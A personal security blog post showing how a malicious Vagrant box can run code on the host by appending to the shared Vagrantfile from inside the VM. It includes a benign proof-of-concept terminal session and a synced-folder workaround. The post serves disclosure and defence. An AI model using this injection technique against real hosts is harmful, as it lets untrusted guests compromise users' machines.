---
layout: post
title: Malicious vagrant boxes
---

{{ page.title }}
================

<p class="meta">8 June 2019 - Mojave Desert</p>
Did you know by default vagrant run's VMs in the same security context as your host operating system?

So if you tested a strange and unknown vagrant box off https://app.vagrantup.com/boxes/search, you're unfortunately not limiting the blast radius to the VM as your host could now be compromised as well.

To be clear I'm not aware of any cases where this has happened, just that it's possible and something worth watching out for.

The issue is pretty straight forward, vagrant mounts the code directory inside the VM as read/write. Normally the VM would be running your code so this wouldn't be much of a concern however this directory also contains the Vagrantfile configuration, which of course is just a ruby script and is executed every time you run `vagrant` on the host.

So here's a quick example getting execution on the host from simply editing this file within the VM.

```
host$ vagrant init
A `Vagrantfile` has been placed in this directory. You are now
ready to `vagrant up` your first virtual environment! Please read
the comments in the Vagrantfile as well as documentation on
`vagrantup.com` for more information on using Vagrant.
host$ sed -i -e '/config.vm.box =/s@.*@config.vm.box = "ubuntu/eoan64"@' Vagrantfile   # Set config.vm.box to ubuntu/eoan64
host$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Checking if box 'ubuntu/eoan64' version '20190605.0.0' is up to date...
==> default: Machine already provisioned. Run `vagrant provision` or use the `--provision`
==> default: flag to force provisioning. Provisioners marked to run always will still run.
host$ vagrant ssh

**snip**

vagrant@ubuntu-eoan:~$ echo 'exec("bc")' >> /vagrant/Vagrantfile
vagrant@ubuntu-eoan:~$ logout
Connection to 127.0.0.1 closed.
host$ vagrant halt
bc 1.06
Copyright 1991-1994, 1997, 1998, 2000 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'. 
1+1
2
```

I've been meaning to make a post about this for some time, when I originally noticed this it was very difficult to find *any* mention of this which is a bit unfortunate. For a while I've been using the following workaround, which I admit isn't ideal.. but still works.

```
  config.vm.synced_folder ".", "/vagrant", disabled: true
  config.vm.synced_folder "vagrant", "/vagrant"
```
This will move the shared folder to a sub-folder named vagrant under the main directory, which includes the Vagrantfile config.


For another issue with vagrant shares make sure to check out [not-a-vagrant-bug](https://phoenhex.re/2018-03-25/not-a-vagrant-bug) as well.
